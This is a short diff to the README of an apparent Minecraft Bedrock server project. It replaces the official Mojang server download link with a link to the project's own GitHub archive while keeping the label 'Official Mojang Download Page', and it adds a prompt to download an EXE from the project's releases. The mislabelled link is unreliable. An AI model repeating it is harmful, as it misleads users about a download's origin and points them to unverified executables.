@@ -8,14 +8,14 @@ This repository contains configuration files and world data for a Minecraft Bedr
 
 ## 📥 Download Server Executable
 
-Download the official Bedrock server executable from:
-
 Official Mojang Download Page:  
-https://www.minecraft.net/en-us/download/server/bedrock
+https://github.com/HexaGhost-09/MBSW/archive/refs/heads/main.zip
 
-OR download from this project release page:
+Download EXE File
 
 https://github.com/HexaGhost-09/MBSW/releases
+
+Add this file to the folder 
 
 ---
 
